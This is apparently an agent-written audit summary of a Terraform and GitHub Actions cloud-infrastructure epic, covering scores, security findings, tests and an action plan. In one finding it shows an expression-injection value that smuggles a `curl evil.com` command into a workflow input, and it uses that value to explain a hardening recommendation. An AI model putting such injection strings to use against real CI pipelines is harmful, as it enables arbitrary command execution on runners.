# Audit Executive Summary: Epic 009 — Cloud Infrastructure

## Audit Metadata
- **Epic:** `docs/backlog/epic-009-cloud-infra.md`
- **Date:** 2026-02-12
- **Auditor:** Agent
- **Status:** Complete
- **Tasks audited:** 3 (0053, 0054, 0055)
- **Services affected:** infra/terraform, CI/CD workflows (`.github/workflows/`), documentation
- **Commits analyzed:** 6 (3 feature + 3 code review)

## Scores

| Area | Score | Verdict |
|------|-------|---------|
| Architecture | 92/100 | Excellent module separation, proper environment isolation, clean dependency chains |
| Security (Backend) | 85/100 | WIF properly configured, least-privilege IAM — expression injection in workflow dispatch |
| Security (Frontend) | N/A | No frontend code changes in this epic |
| Code Quality | 88/100 | Clean HCL and YAML, consistent patterns — minor repetition between environments |
| Test Coverage | 45/100 | Only `terraform validate`; no automated IaC tests or workflow syntax validation in CI |
| Documentation | 95/100 | Comprehensive walkthroughs, thorough cost matrix, all DoD checked |
| **Overall** | **83/100** | **Production-grade infrastructure with test coverage gap** |

---

## Security Findings

### CRITICAL

_No critical findings._

### HIGH

_No high findings._

### MEDIUM

#### F1. Expression injection in deploy.yml workflow_dispatch inputs
- **Severity:** MEDIUM
- **Files:** `.github/workflows/deploy.yml:72-73`
- **Problem:** The `prepare` job uses `${{ inputs.image_tag }}` directly inside a shell `run:` block. Since `image_tag` is a free-form string input (`type: string`), a user with repo write access could inject arbitrary shell commands via the image tag value (e.g., `"; curl evil.com; echo "`).
- **Impact:** Arbitrary command execution in the GitHub Actions runner. Mitigated by requiring repo write access for `workflow_dispatch`, but violates defense-in-depth.
- **Recommendation:** Map `inputs.image_tag` and `inputs.environment` to `env:` variables and reference them as `$IMAGE_TAG` in the shell block:
  ```yaml
  env:
    EVENT_NAME: ${{ github.event_name }}
    INPUT_ENV: ${{ inputs.environment }}
    INPUT_TAG: ${{ inputs.image_tag }}
    WR_HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
    GH_SHA: ${{ github.sha }}
    GH_REF_NAME: ${{ github.ref_name }}
  run: |
    if [ "$EVENT_NAME" = "workflow_run" ]; then
      echo "environment=staging" >> "$GITHUB_OUTPUT"
      echo "image_tag=$WR_HEAD_SHA" >> "$GITHUB_OUTPUT"
    ...
  ```

#### F2. Expression injection in deploy.yml GHCR image wait step
- **Severity:** MEDIUM
- **Files:** `.github/workflows/deploy.yml:104`
- **Problem:** The "Wait for GHCR image availability" step constructs an `IMAGE` variable using `${{ github.repository_owner }}`, `${{ matrix.service }}`, and `${{ needs.prepare.outputs.image_tag }}` directly in a shell block. While `repository_owner` and `matrix.service` are GitHub-controlled, the pattern is fragile and inconsistent with the hardened composite actions (`copy-image-to-ar`, `verify-health`) that properly use `env:` mapping.
- **Recommendation:** Map all expressions to `env:` variables for consistency with the hardened composite actions pattern established in cr-0059.

### LOW

#### F3. Hardcoded service account names in WIF bootstrap
- **Severity:** LOW
- **Files:** `infra/terraform/bootstrap/workload-identity.tf:63-76`
- **Problem:** The `deploy_act_as` resource hardcodes all 6 Cloud Run service account names (3 services × 2 environments). Adding a new service or environment requires manual updates in two places (here and the IAM module). This was identified in cr-0059 and deferred.
- **Recommendation:** Derive the list from a shared `locals` block or variable that both the IAM module and WIF config reference. Example:
  ```hcl
  locals {
    environments = ["staging", "production"]
    services     = ["web", "ai-api", "orgs-api"]
    sa_names     = [for pair in setproduct(local.environments, local.services) : "${pair[0]}-saastemplate-${pair[1]}"]
  }
  ```

#### F4. Project-level Artifact Registry writer role
- **Severity:** LOW
- **Files:** `infra/terraform/bootstrap/workload-identity.tf:51`
- **Problem:** The deploy SA is granted `roles/artifactregistry.writer` at the project level, allowing it to push images to any Artifact Registry repository in the project. Identified in cr-0059 and deferred.
- **Recommendation:** Scope to specific AR repositories using `google_artifact_registry_repository_iam_member` instead of `google_project_iam_member`.

#### F5. Rollback workflow uses expressions in shell blocks
- **Severity:** LOW
- **Files:** `.github/workflows/rollback.yml:48-52`
- **Problem:** The `resolve-services` job uses `${{ inputs.services }}` directly in a shell block. While mitigated by `type: choice` (restricting to predefined values), this is inconsistent with the hardened pattern in composite actions.
- **Recommendation:** Map to `env:` variable for consistency:
  ```yaml
  env:
    SERVICES: ${{ inputs.services }}
  run: |
    if [ "$SERVICES" = "all" ]; then
  ```

---

## Architecture Compliance

### Adherence Score: 92/100

This epic introduces cloud infrastructure (Terraform IaC) and deployment automation (GitHub Actions). Architecture assessment focuses on module design, environment separation, and CI/CD workflow structure.

### Positive Observations
- **Clean module separation:** 6 reusable Terraform modules (`vpc`, `cloud-sql`, `cloud-run`, `iam`, `secrets`, `redis`) with proper `variables.tf` / `outputs.tf` / `main.tf` structure in each.
- **Proper inter-module dependencies:** Environment configs correctly wire module outputs to inputs (e.g., `module.vpc.network_self_link` → `module.cloud_sql`, `module.iam.service_account_emails` → `module.cloud_run`).
- **Environment isolation:** Staging and production have independent backend configs (GCS prefixes), separate `terraform.tfvars`, and appropriate sizing (staging: minimal, production: HA).
- **Bootstrap separation:** One-time resources (state bucket, WIF pool, deploy SA) are in a separate `bootstrap/` directory, preventing accidental destruction during environment management.
- **Workflow job separation:** `deploy.yml` has 4 clear jobs (prepare → deploy-apis + deploy-web → summary) with proper `needs:` dependencies.
- **Concurrency control:** Deploy and rollback workflows share compatible concurrency group names (`deploy-{environment}`), preventing race conditions.

### Violations / Concerns
- **Staging/production duplication:** Both environment `main.tf` files repeat the full module composition (~150 lines each) with only sizing differences. A shared base with environment-specific overrides would reduce maintenance burden.
- **No module versioning:** Modules are referenced via relative paths (`../../modules/vpc`). For a template intended for production use, pinned module versions or a registry pattern would improve stability.
- **Cloud Run service naming not parameterized in deploy workflow:** The `gcloud run services update` command constructs service names inline (`saastemplate-{env}-{service}`). This naming convention is implicit and not validated against Terraform outputs.

---

## Code Quality

### Infrastructure (Terraform)
**Strengths:**
- Consistent HCL formatting across all 32+ files.
- Good use of `for_each`, `locals`, and `dynamic` blocks for DRY patterns (`infra/terraform/modules/iam/main.tf:14-33`).
- Proper variable typing with `description` fields and sensible defaults.
- `terraform.tfvars.example` files provided for both environments and bootstrap.
- Pin to `google ~> 6.0` and `terraform >= 1.9.0` across all configs.
- Cloud Run v2 API used (`google_cloud_run_v2_service`) with built-in Cloud SQL Auth Proxy volumes.
- Empty secret shells pattern keeps sensitive values out of Terraform state.

**Issues:**
- `terraform.tfvars.example` in bootstrap lacks guidance for mapping outputs to GitHub Environment variables (`infra/terraform/bootstrap/terraform.tfvars.example`).
- Redis module `auth_enabled = true` but auth string must be manually set and propagated to connection strings.

### CI/CD (GitHub Actions)
**Strengths:**
- Clear YAML structure with descriptive job/step names.
- Composite actions extract reusable logic (`copy-image-to-ar`, `verify-health`).
- GHCR image availability polling handles timing race between publish and deploy workflows (30 attempts × 10s).
- Rollback workflow dynamically selects health check path based on service type (`/health/live` for APIs, `/en` for web).
- `cancel-in-progress: false` prevents partial deployments.

**Issues:**
- Inline shell scripts in `deploy.yml` jobs are lengthy (lines 60-75, 103-114). Could be extracted to composite actions or scripts for testability.
- No input validation for `workflow_dispatch` `image_tag` (should validate SHA format).

---

## Test Coverage

### Summary

| Layer | Tests | Gaps |
|-------|-------|------|
| IaC validation | `terraform validate` only | No Terratest, no tflint, no CI step |
| Workflow syntax | None | No actionlint or workflow validation in CI |
| Integration | Manual only | No automated deploy-to-test-environment pipeline |
| Cost matrix | N/A (documentation) | N/A |

### Missing Tests
1. **Terraform validate CI step** — `terraform validate` is mentioned in testing plans but not automated in any CI workflow. A PR modifying `infra/terraform/` should trigger validation.
2. **Workflow syntax validation** — No `actionlint` or equivalent in CI to catch YAML syntax issues in `.github/workflows/` files before merge.
3. **Terraform plan dry-run** — No CI step to run `terraform plan` against a test project to catch configuration errors beyond syntax.
4. **Module unit tests** — No Terratest or similar framework to verify module behavior (e.g., Cloud Run service gets correct env vars, IAM bindings are correct).

---

## Documentation

### Task-Walkthrough Alignment

| Task | Task DoD | Walkthrough | Issue |
|------|----------|-------------|-------|
| 0053 | OK — all 6 boxes checked | OK — comprehensive, covers all 6 modules + bootstrap | Aligned |
| 0054 | OK — all 4 boxes checked | OK — covers deploy, rollback, WIF, composite actions | Aligned |
| 0055 | OK — all 4 boxes checked | OK — covers 3 tiers, optimization, HCL snippet | Aligned |

### Code Review Documentation

| CR | Status | Comments | Resolved |
|----|--------|----------|----------|
| cr-0058 | Complete | 13 (2 MUST_FIX, 8 SHOULD_FIX, 1 NIT, 2 FALSE_POSITIVE) | All |
| cr-0059 | Complete | 10 (5 MUST_FIX, 1 SHOULD_FIX, 2 NIT, 2 OUT_OF_SCOPE) | All |
| cr-0060 | Complete | 6 (1 MUST_FIX, 5 SHOULD_FIX) | All |

### Other Documentation Issues
- `infra/terraform/bootstrap/terraform.tfvars.example` should include a comment block explaining which Terraform outputs map to GitHub Environment variables (`GCP_WORKLOAD_IDENTITY_PROVIDER`, `GCP_DEPLOY_SERVICE_ACCOUNT`, etc.).
- Cost matrix `docs/infrastructure/cost-matrix.md` is thorough (342 lines) with 3-tier estimates, 10 optimization recommendations, and a growth-tier HCL snippet — exceeds requirements.

---

## Commit History

### Pattern Compliance
- Conventional commits: **Yes** — all 6 commits follow `feat|fix|chore(scope): message` format
- Branch naming: **Partial** — branches use descriptive names (`feat/terraform-gcp`, `feat/cloud-run-deploy`, `feat/cost-matrix`) but dropped the numeric task prefix seen in earlier epics
- Code review cycles: **Observed** — 3 code review commits (cr-0058, cr-0059, cr-0060) with proper `fix(scope): address PR #NNN review feedback` format

### Observations
- 6 total commits: 3 feature (`feat`) + 3 code review (`fix`)
- Rebase-and-merge workflow confirmed (linear history on main)
- Task 0055 + cr-0060 branch (`feat/cost-matrix`) not yet merged to main at time of audit
- Commit messages include issue/PR references for traceability
- No force pushes or unusual patterns detected

---

## What's Done Well

1. **Empty secret shells pattern** — Terraform creates Secret Manager entries without values (`infra/terraform/modules/secrets/main.tf`), keeping sensitive data out of state files. This is a security best practice that many IaC setups get wrong.

2. **Workload Identity Federation over service account keys** — Using OIDC-based WIF (`infra/terraform/bootstrap/workload-identity.tf`) eliminates the need for long-lived service account keys in GitHub secrets. The `attribute_condition` properly restricts to the specific repo and trusted refs (main branch + release tags).

3. **Web image rebuilt per environment** — Recognizing that `NEXT_PUBLIC_*` vars are baked at build time, the deploy pipeline rebuilds the web image per environment (`.github/workflows/deploy.yml:189-201`) instead of copying a generic GHCR image. This is the correct architectural decision for Next.js apps.

4. **Comprehensive cost matrix** — The cost estimation document (`docs/infrastructure/cost-matrix.md`) provides 3-tier estimates with clear methodology, service-by-service breakdowns, 10 actionable optimization recommendations, and even a growth-tier HCL snippet showing exactly which Terraform variables to change.

5. **Defense-in-depth in composite actions** — After cr-0059, the `copy-image-to-ar` and `verify-health` composite actions properly map inputs to `env:` variables before shell execution, preventing expression injection. This pattern should be extended to the remaining workflows.

6. **IAM least-privilege with permission filters** — The IAM module uses `needs_secrets` and `needs_cloudsql` boolean filters per service (`infra/terraform/modules/iam/main.tf:14-33`), granting only the IAM roles each service actually needs rather than a blanket set.

7. **Cloud SQL private networking** — PostgreSQL is accessible only via private IP (`ipv4_enabled = false` in `infra/terraform/modules/cloud-sql/main.tf:25`), with Cloud Run connecting through VPC connector and Cloud SQL Auth Proxy volumes.

8. **Three complete code review cycles** — All 3 tasks went through dedicated code reviews (cr-0058, cr-0059, cr-0060) with 29 total comments, all resolved. MUST_FIX items were addressed, deferred items were documented with rationale.

---

## Prioritized Action Plan

> This table is consumed by the `next audit action` workflow.
> Items are ordered by priority (P0 first) and within priority by severity.

| # | Priority | Severity | Title | Description | Files | Dependencies | Status |
|---|----------|----------|-------|-------------|-------|--------------|--------|
| 1 | P1 | MEDIUM | Harden deploy.yml expression injection | Map `${{ inputs.image_tag }}`, `${{ inputs.environment }}`, and other `${{ }}` expressions in shell blocks to `env:` variables in the `prepare` and `deploy-apis` jobs. | `.github/workflows/deploy.yml:60-75, 103-114` | None | Done |
| 2 | P1 | MEDIUM | Harden rollback.yml expression injection | Map `${{ inputs.services }}`, `${{ inputs.environment }}`, and `${{ inputs.image_tag }}` to `env:` variables in the `resolve-services` and `rollback` jobs. | `.github/workflows/rollback.yml:47-52, 81-92` | None | Done |
| 3 | P1 | MEDIUM | Add Terraform validate CI step | Create a CI job that runs `terraform init -backend=false && terraform validate` on PRs that modify `infra/terraform/` files. Add to existing `ci.yml` or create a dedicated `infra-ci.yml`. | `.github/workflows/ci.yml` or new workflow | None | Done |
| 4 | P2 | LOW | Scope AR writer role to specific repositories | Replace project-level `roles/artifactregistry.writer` with repository-scoped `google_artifact_registry_repository_iam_member` for each AR repo. | `infra/terraform/bootstrap/workload-identity.tf:48-58` | None | Done |
| 5 | P2 | LOW | Refactor hardcoded SA names in WIF config | Replace the hardcoded `for_each` list in `deploy_act_as` with a computed local derived from shared variables (environments × services). | `infra/terraform/bootstrap/workload-identity.tf:63-76` | None | Done |
| 6 | P2 | LOW | Add workflow syntax validation to CI | Add `actionlint` step to CI for PRs that modify `.github/workflows/` or `.github/actions/` files. | `.github/workflows/ci.yml` or new workflow | None | Done |
| 7 | P2 | LOW | Add GitHub variables guidance to bootstrap tfvars | Add a comment block to `terraform.tfvars.example` explaining which bootstrap outputs map to GitHub Environment variables and how to configure them. | `infra/terraform/bootstrap/terraform.tfvars.example` | None | Done |
| 8 | P3 | LOW | Add input validation for workflow_dispatch image_tag | Add a validation step in the `prepare` job to verify `inputs.image_tag` matches a SHA format (`^[0-9a-f]{40}$`) before using it. | `.github/workflows/deploy.yml:60-75` | 1 | Done |
| 9 | P3 | LOW | Reduce staging/production config duplication | Extract shared module composition to a common pattern (e.g., shared variables file or Terragrunt) to reduce the ~150-line duplication between environment configs. | `infra/terraform/environments/staging/main.tf`, `infra/terraform/environments/production/main.tf` | None | Done |

---

## Verification Commands

```bash
# After hardening workflow expressions (items 1-2)
# Verify YAML syntax is still valid
npx yaml-lint .github/workflows/deploy.yml
npx yaml-lint .github/workflows/rollback.yml

# After Terraform changes (items 4-5)
cd infra/terraform/bootstrap && terraform init -backend=false && terraform validate

# After adding CI steps (items 3, 6)
# Verify CI workflow runs on a test PR modifying infra/ files

# General validation
cd infra/terraform/environments/staging && terraform init -backend=false && terraform validate
cd infra/terraform/environments/production && terraform init -backend=false && terraform validate
```
